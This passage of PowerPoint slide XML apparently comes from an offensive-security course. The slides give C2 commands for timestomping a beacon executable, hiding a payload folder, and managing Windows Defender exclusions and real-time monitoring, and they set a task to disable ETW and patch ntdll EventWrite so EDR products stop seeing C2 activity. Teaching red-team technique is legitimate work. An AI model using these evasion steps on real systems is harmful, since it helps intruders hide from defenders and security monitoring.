                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Upload to target:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>upload /path/to/SetMace.exe C:\payload\SetMace.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Run it to change timestamps:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o C:\payload\SetMace.exe -a "2018-01-01 00:00:00" C:\payload\beacon.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33116958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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 8: Hide the Payload Folder (Optional)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Set the hidden attribute on the folder to make it less visible in Explorer:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>attrib</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> +h C:\payload“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 9: Keep Defender Exclusions Active</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The exclusion remains active until you remove it. If you want to remove the exclusion later (to restore normal scanning):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ExclusionPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 'C:\payload' -Remove“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 10: Re-enable Real-Time Monitoring (If You Disabled It in Part 1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If you disabled Defender real-time monitoring earlier, re-enable it now:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>DisableRealtimeMonitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> $false"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Verify it is enabled:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> | Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>DisableRealtimeMonitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38301015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EC656-C114-4C47-ACFF-EBF4580E73BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="500062"/>
            <a:ext cx="11475720" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" kern="100"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Task 02: ETW Patching – Blind the EDR Kernel Sensors (Beyond AMSI)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2DA0EF0-78A3-4E6F-BFFF-E81E138DCD7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="167640" y="1825624"/>
            <a:ext cx="11186160" cy="5121275"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Description: Week 09 focused on AMSI (script scanning). EDRs (like CrowdStrike, Defender for Endpoint) rely heavily on ETW (Event Tracing for Windows) at the kernel level to feed process creation, network connections, and registry changes to the cloud dashboard. You will disable ETW silently, making the EDR blind to everything you do next.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Technical Requirements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · ETW Patch via .NET (Critical): In your C2, run a custom C# assembly that uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NtSetInformationProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 to disable ETW for the current PowerShell/.NET process by setting the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 to 0. (This bypasses kernel telemetry without touching LSASS or rebooting).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Verification: Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 before and after the patch. Show that Event Traces are still running, but your process is no longer feeding data into them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Advanced: Disable Network Telemetry: Patch the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>EventWrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>EventWriteTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 in ntdll.dll for your specific beacon process so that the EDR's network driver never receives metadata about your C2 beaconing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Learning Goal: Discover the difference between Userland evasion (Week 09) and Kernel-level telemetry bypass. EDRs are blind without ETW data—patching it makes you a ghost inside the host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22607059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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>TASK 02 – PART 1: ETW PATCH VIA .NET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What Is ETW Patching?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ETW (Event Tracing for Windows) is the kernel-level telemetry system that EDRs like CrowdStrike and Defender for Endpoint rely on. It feeds process creation, network connections, registry changes, and other system events directly to the EDR's cloud dashboard. AMSI (which you covered in Week 09) only scans scripts. ETW operates at a much deeper level. By patching ETW, you make the EDR blind to everything your process does.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The technique is simple: You call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>NtSetInformationProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> on your current process and set the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> to 0. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This disables all ETW events originating from your process. The EDR's kernel driver still runs, but your process no longer feeds it any data. This bypasses kernel telemetry without touching LSASS or rebooting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40570086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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
